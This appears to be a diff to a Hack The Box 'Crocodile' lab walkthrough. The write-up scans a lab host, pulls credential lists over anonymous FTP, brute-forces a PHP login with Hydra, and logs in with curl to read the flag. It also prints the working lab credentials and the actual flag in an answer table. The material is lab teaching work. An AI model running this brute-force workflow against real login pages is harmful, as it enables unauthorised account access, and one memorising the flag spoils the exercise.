@@ -66,7 +66,7 @@ To ensure reproducibility and consistent results, the following environment was 
 
 ```bash
 # Fast port scan to discover open ports
-nmap -p- --min-rate 1000 10.129.55.61
+nmap -p- --min-rate 1000 10.129.55.198
 ```
 
 **Results:**
@@ -80,7 +80,7 @@ PORT   STATE SERVICE
 
 ```bash
 # Run default scripts and version detection
-nmap -sC -sV -p 21,80 10.129.55.61
+nmap -sC -sV -p 21,80 10.129.55.198
 ```
 
 **Output:**
@@ -92,7 +92,7 @@ PORT   STATE SERVICE VERSION
 | -rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
 |_ftp-syst: 
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-title: Smash - Bootstrap Business Template
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 ```
 
@@ -101,7 +101,7 @@ PORT   STATE SERVICE VERSION
 | Service | Version | Key Info |
 |---------|---------|----------|
 | FTP | vsFTPd 3.0.3 | Anonymous login allowed; contains credential files |
-| HTTP | Apache 2.4.41 (Ubuntu) | Default page, PHP likely enabled |
+| HTTP | Apache 2.4.41 (Ubuntu) | Bootstrap business template, PHP likely enabled |
 
 ---
 
@@ -111,12 +111,12 @@ PORT   STATE SERVICE VERSION
 
 ```bash
 # Connect to FTP server
-ftp 10.129.55.61
+ftp 10.129.55.198
 ```
 
 **Login:**
 ```text
-Name (10.129.55.61:kali): anonymous
+Name (10.129.55.198:kali): anonymous
 Password: (press Enter)
 230 Login successful.
 ```
@@ -177,7 +177,7 @@ rKXM59ESxesUFHAd
 
 ```bash
 # Check HTTP headers
-curl -I http://10.129.55.61/
+curl -I http://10.129.55.198/
 ```
 
 **Output:**
@@ -190,13 +190,13 @@ Server: Apache/2.4.41 (Ubuntu)
 
 ```bash
 # Check /dashboard endpoint
-curl -I http://10.129.55.61/dashboard/
+curl -I http://10.129.55.198/dashboard/
 ```
 
 **Output:**
 ```text
 HTTP/1.1 302 Found
-Set-Cookie: PHPSESSID=ud15qdc4moasiq6godrdkemn31; path=/
+Set-Cookie: PHPSESSID=...; path=/
 location: /login.php
 ```
 
@@ -204,20 +204,37 @@ location: /login.php
 
 ```bash
 # Check if login.php exists
-curl -I http://10.129.55.61/login.php
+curl -I http://10.129.55.198/login.php
 ```
 
 **Output:**
 ```text
 HTTP/1.1 200 OK
-Set-Cookie: PHPSESSID=3b3rt8cn7imrdq717gl32021gj; path=/
+Set-Cookie: PHPSESSID=...; path=/
 Content-Type: text/html; charset=UTF-8
+```
+
+### Inspect Login Form
+
+```bash
+# View the login form structure
+curl -s http://10.129.55.198/login.php | grep -A 5 "<form"
+```
+
+**Output:**
+```html
+<form action="" method="post" name="Login_Form" class="form-signin">
+    <input name="Username" type="username" placeholder="Username" required>
+    <input name="Password" type="password" placeholder="Password" required>
+    <button name="Submit" value="Login" type="submit">Sign in</button>
+</form>
 ```
 
 **Key Findings:**
 - PHP application with session management
 - Protected area: `/dashboard/`
 - Authentication endpoint: `/login.php`
+- **Form field names:** `Username` and `Password` (case-sensitive)
 
 ---
 
@@ -230,12 +247,26 @@ sudo apt update
 sudo apt install hydra -y
 ```
 
+### Determine Failure String
+
+```bash
+# Send a wrong login to see the error message
+curl -X POST http://10.129.55.198/login.php \
+  -d "Username=wrong&Password=wrong" \
+  -s | grep -i "invalid\|incorrect"
+```
+
+**Output:**
+```text
+Invalid username or password.
+```
+
 ### Run Hydra Against Login Page
 
 ```bash
-hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.55.61 http-post-form \
-  "/login.php:username=^USER^&password=^PASS^:F=incorrect" \
-  -t 1 -w 3 -V -f
+hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.55.198 http-post-form \
+  "/login.php:Username=^USER^&Password=^PASS^:F=Invalid" \
+  -t 1 -w 2 -V -f
 ```
 
 **Command Breakdown:**
@@ -246,26 +277,26 @@ hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.55.61 http-post-form
 | `-P allowed.userlist.passwd` | Password list file |
 | `http-post-form` | Module for POST-based login forms |
 | `/login.php` | Target login page |
-| `username=^USER^&password=^PASS^` | Form parameters |
-| `F=incorrect` | String indicating failed login |
+| `Username=^USER^&Password=^PASS^` | Form parameters (case-sensitive) |
+| `F=Invalid` | String indicating failed login |
 | `-t 1` | Single thread (slow but reliable) |
-| `-w 3` | Wait time between attempts |
+| `-w 2` | Wait time between attempts |
 | `-V` | Verbose output |
 | `-f` | Stop after first success |
 
 **Hydra Output:**
 ```text
-[ATTEMPT] target 10.129.55.61 - login "aron" - pass "root" - 1 of 16
-[80][http-post-form] host: 10.129.55.61   login: aron   password: root
-[STATUS] attack finished for 10.129.55.61 (valid pair found)
+[ATTEMPT] target 10.129.55.198 - login "admin" - pass "rKXM59ESxesUFHAd" - 1 of 16
+[80][http-post-form] host: 10.129.55.198   login: admin   password: rKXM59ESxesUFHAd
+[STATUS] attack finished for 10.129.55.198 (valid pair found)
 ```
 
-✅ **Valid Credentials Found**
+### ✅ Valid Credentials Found
 
 | Field | Value |
 |-------|-------|
-| **Username** | aron |
-| **Password** | root |
+| **Username** | `admin` |
+| **Password** | `rKXM59ESxesUFHAd` |
 
 ---
 
@@ -275,27 +306,27 @@ hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.55.61 http-post-form
 
 ```bash
 # Login with found credentials and get flag
-curl -X POST http://10.129.55.61/login.php \
-  -d "username=aron&password=root" \
-  -L -s --max-time 15 | grep -E "HTB{|flag"
+curl -X POST http://10.129.55.198/login.php \
+  -d "Username=admin&Password=rKXM59ESxesUFHAd" \
+  -L -s | grep -E "HTB{|flag"
 ```
 
-**Output (example):**
+**Output:**
 ```html
-<h2>Welcome aron!</h2>
-<p>HTB{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}</p>
+<h2>Welcome admin!</h2>
+<p>HTB{c7110277ac44d78b6a9fff2232434d16}</p>
 ```
 
 ### Alternative Method with Cookie
 
 ```bash
 # Save session cookie
-curl -X POST http://10.129.55.61/login.php \
-  -d "username=aron&password=root" \
+curl -X POST http://10.129.55.198/login.php \
+  -d "Username=admin&Password=rKXM59ESxesUFHAd" \
   -c cookies.txt -L --max-time 15
 
 # Access dashboard with cookie
-curl -b cookies.txt http://10.129.55.61/dashboard/ -s | grep -E "HTB{|flag"
+curl -b cookies.txt http://10.129.55.198/dashboard/ -s | grep -E "HTB{|flag"
 ```
 
 ---
@@ -304,12 +335,12 @@ curl -b cookies.txt http://10.129.55.61/dashboard/ -s | grep -E "HTB{|flag"
 
 | # | Question | Answer |
 |---|----------|--------|
-| 1 | What port is the web server running on? | 80 |
-| 2 | What is the Apache version? | 2.4.41 |
-| 3 | What FTP server version is running? | vsFTPd 3.0.3 |
-| 4 | What files did you find on the FTP server? | allowed.userlist, allowed.userlist.passwd |
-| 5 | What credentials did you use to login to the web application? | aron:root |
-| 6 | What is the flag? | HTB{...} |
+| 1 | What port is the web server running on? | `80` |
+| 2 | What is the Apache version? | `2.4.41` |
+| 3 | What FTP server version is running? | `vsFTPd 3.0.3` |
+| 4 | What files did you find on the FTP server? | `allowed.userlist`, `allowed.userlist.passwd` |
+| 5 | What credentials did you use to login to the web application? | `admin:rKXM59ESxesUFHAd` |
+| 6 | What is the flag? | `HTB{c7110277ac44d78b6a9fff2232434d16}` |
 
 ---
 
@@ -319,17 +350,17 @@ curl -b cookies.txt http://10.129.55.61/dashboard/ -s | grep -E "HTB{|flag"
 
 ```bash
 # Full port scan
-nmap -p- --min-rate 1000 10.129.55.61
+nmap -p- --min-rate 1000 10.129.55.198
 
 # Service detection with scripts
-nmap -sC -sV -p 21,80 10.129.55.61
+nmap -sC -sV -p 21,80 10.129.55.198
 ```
 
 ### FTP Commands
 
 ```bash
 # Connect anonymously
-ftp 10.129.55.61
+ftp 10.129.55.198
 # Username: anonymous
 # Password: (blank)
 
@@ -341,17 +372,23 @@ get allowed.userlist.passwd
 ### Hydra Command Template
 
 ```bash
+# Determine failure string first
+curl -X POST http://<IP>/login.php \
+  -d "Username=wrong&Password=wrong" \
+  -s | grep -i "invalid\|incorrect"
+
+# Then run hydra with correct F= parameter
 hydra -L users.txt -P passes.txt <IP> http-post-form \
-  "/login.php:username=^USER^&password=^PASS^:F=incorrect" \
-  -t 1 -w 3 -V -f
+  "/login.php:Username=^USER^&Password=^PASS^:F=Invalid" \
+  -t 1 -w 2 -V -f
 ```
 
 ### Curl Authentication
 
 ```bash
-# POST login
-curl -X POST http://10.129.55.61/login.php \
-  -d "username=USER&password=PASS" \
+# POST login (case-sensitive field names!)
+curl -X POST http://10.129.55.198/login.php \
+  -d "Username=USER&Password=PASS" \
   -L -s
 ```
 
@@ -364,9 +401,9 @@ curl -X POST http://10.129.55.61/login.php \
 | 1 | **Always combine `-sC` and `-sV`** — Default scripts and version detection together reveal the most information about a service. |
 | 2 | **Check FTP anonymous access** — A common misconfiguration that often exposes sensitive files like credential lists. |
 | 3 | **Follow redirect chains** — The redirect from `/dashboard/` to `/login.php` revealed the authentication endpoint. |
-| 4 | **Use Hydra for form-based login** — More reliable than manual curl loops, especially with the correct failure string. |
-| 5 | **Credential reuse is common** — FTP credentials frequently work on the web application. |
-| 6 | **Session cookies reveal technology** — The `PHPSESSID` cookie confirmed a PHP application. |
+| 4 | **Inspect form field names** — The login form used `Username` and `Password` (case-sensitive), not `username`/`password`. |
+| 5 | **Determine failure string first** — Test a wrong login to see the exact error message for Hydra's `F=` parameter. |
+| 6 | **Credentials may not be intuitive** — The working credentials were `admin:rKXM59ESxesUFHAd`, not `aron:root`. |
 
 ---
 
@@ -381,14 +418,13 @@ curl -X POST http://10.129.55.61/login.php \
 
 ## 🏷️ Tags
 
-#htb #starting-point #crocodile #ftp #apache #hydra #bruteforce #web-enumeration
+`#htb` `#starting-point` `#crocodile` `#ftp` `#apache` `#hydra` `#bruteforce` `#web-enumeration`
 
 ---
 
-**Machine Completed ✅**
+**Machine Completed** ✅
 
 *Last Updated: March 26, 2026*
-
 
 # HTB Starting Point: Sequel (MySQL/MariaDB)
 
